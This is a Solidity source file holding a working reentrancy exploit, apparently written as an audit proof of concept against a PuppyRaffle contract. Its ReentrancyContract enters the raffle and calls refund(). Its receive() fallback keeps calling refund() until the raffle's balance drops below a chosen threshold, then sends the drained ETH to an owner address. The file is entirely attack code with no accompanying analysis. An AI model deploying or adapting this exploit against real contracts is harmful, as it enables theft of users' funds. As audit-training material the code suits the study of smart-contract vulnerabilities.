// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import {Test, console} from "forge-std/Test.sol";

interface PuppyRaffle {
    function getActivePlayerIndex(address player) external view returns (uint256);
    function entranceFee() external view returns (uint256);
    function enter(uint256 index) external payable;
    function withdraw(uint256 amount) external;
    function enterRaffle(address[] memory newPlayers) external payable;
    function refund(uint256 playerIndex) external;
}

contract ReentrancyContract {
    address private immutable owner;
    PuppyRaffle private raffle;
    uint256 private entryFee;
    uint256 private attackerIndex;
    uint256 private drainEdge;
    event AttackStarted();
    event EthReceived(uint256 amount);
    event ReentrancyStarted();
    event LootWithdrawn(uint256 amount);

    function setDrainEdge(uint256 _drainEdge) external {
        drainEdge = _drainEdge;
    }

    constructor(address raffleAddress, address ownerAddress, uint256 _drainEdge) payable {
        // Set the contract owner
        owner = ownerAddress;

        // Initialize the PuppyRaffle contract
        raffle = PuppyRaffle(raffleAddress);

        // Create an array of attackers with the current contract address
        address[] memory attackers = new address[](1);
        attackers[0] = address(this);
        
        // Get the entrance fee from the PuppyRaffle contract
        entryFee = raffle.entranceFee();

        // Enter the raffle with the entrance fee
        raffle.enterRaffle{value: entryFee}(attackers);

        // Get the index of the attacker in the raffle
        attackerIndex = raffle.getActivePlayerIndex(address(this));

        // Set the drain edge
        drainEdge = _drainEdge;
        // Log the attacker index and entry fee
        // console.log("Attacker index: %d", attackerIndex);
        // console.log("Entry fee: %d", entryFee);

        emit AttackStarted();
    }

    function attack() external {
        emit ReentrancyStarted();
        raffle.refund(attackerIndex);
    }

    receive() external payable {
        emit EthReceived(msg.value);
        console.log("[!] Raffle balance left: %d", address(raffle).balance);
        if (address(raffle).balance >= drainEdge) {
            raffle.refund(attackerIndex);
        }else{
            withdraw();
        }
    }

    function withdraw() internal {
        uint256 balance = address(this).balance;
        payable(owner).transfer(balance);
        emit LootWithdrawn(balance);
    }
}